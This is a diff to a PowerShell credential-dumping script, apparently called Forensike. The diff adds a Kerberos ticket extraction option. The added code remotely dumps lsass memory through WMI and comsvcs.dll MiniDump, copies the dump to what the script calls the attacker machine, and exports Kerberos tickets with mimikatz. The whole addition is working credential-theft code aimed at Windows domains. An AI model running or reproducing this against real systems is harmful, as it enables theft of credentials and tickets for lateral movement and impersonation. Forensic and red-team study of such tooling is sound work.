@@ -37,8 +37,11 @@ Param(
    [string]$dumpDir,
 
    [Parameter(Mandatory=$False)]
-   [switch]$Metadata
-     
+   [switch]$Metadata,
+
+   [Parameter(Mandatory=$False)]
+   [switch]$Kerberos
+
     )
    
 echo "====================================================================="
@@ -240,6 +243,46 @@ if ($confirmation -ne 'Y' -and $confirmation -ne 'y') {
 	# Displays hashes back
 	$EndHashes = Get-Content -Path "$dumpDir\hashes.txt" | Select-String -Pattern " Domain   :| Username :|NTLM     :| DPAPI    :" | Out-File -FilePath $dumpDir\forensike_results.txt
 	
+	## Kerberos Ticket Extractor
+	if ($Kerberos) {
+		echo "====================================================================="
+		Write-Host -ForegroundColor White -BackgroundColor Darkred ">>>>>>>>>>[ STARTING KERBEROS TICKET EXTRACTION ]<<<<<<<<<<<"
+		echo "====================================================================="
+
+		# 1 - Get lsass PID on the remote machine via WMI
+		$lsassPID = (Get-WmiObject Win32_Process -ComputerName $target -Filter "Name='lsass.exe'").ProcessId
+		Write-Host -ForegroundColor Green "LSASS PID on $target : $lsassPID"
+
+		# 2 - Create a lsass minidump on the remote machine using the built-in comsvcs.dll MiniDump — no extra binary needed
+		$miniDumpRemotePath = "$ForensikeFolder\lsass_mini.dmp"
+		$miniDumpCmd = "rundll32 C:\Windows\System32\comsvcs.dll MiniDump $lsassPID $miniDumpRemotePath full"
+		Invoke-WmiMethod -class Win32_process -name Create -ArgumentList $miniDumpCmd -ComputerName $target | Out-Null
+		Write-Host "Waiting for minidump to complete..."
+		Start-Sleep -Seconds 15
+
+		# 3 - Copy the minidump back to the attacker machine via the existing PSDrive
+		$miniDumpLocalPath = "$dumpDir\lsass_mini.dmp"
+		Copy-Item "Forensike:\Windows\Temp\Forensike\lsass_mini.dmp" $miniDumpLocalPath
+		Write-Host -ForegroundColor Green "Minidump copied to $miniDumpLocalPath"
+
+		# 4 - Run mimikatz.exe locally against the minidump, export tickets as .kirbi files
+		$kirbiDir = "$dumpDir\kirbi"
+		New-Item -Path $kirbiDir -ItemType Directory -Force | Out-Null
+		# Resolve to absolute paths before Push-Location changes the working directory
+		$mimikatzAbsPath = (Resolve-Path "$toolsDir\mimikatz.exe").Path
+		$miniDumpAbsPath = (Resolve-Path $miniDumpLocalPath).Path
+		Push-Location $kirbiDir
+		& $mimikatzAbsPath "sekurlsa::minidump $miniDumpAbsPath" "sekurlsa::tickets /export" "exit"
+		Pop-Location
+
+		$kirbiCount = (Get-ChildItem -Path $kirbiDir -Filter "*.kirbi" -ErrorAction SilentlyContinue | Measure-Object).Count
+		echo ""
+		echo "====================================================================="
+		Write-Host -ForegroundColor DarkGreen "$kirbiCount Kerberos ticket(s) exported to $kirbiDir"
+		echo "====================================================================="
+		echo ""
+	}
+
 		#Clean everything up
 		#Delete the remote Forensike folder tools
 		Write-Host -Fore Green "Cleaning up the mess...."
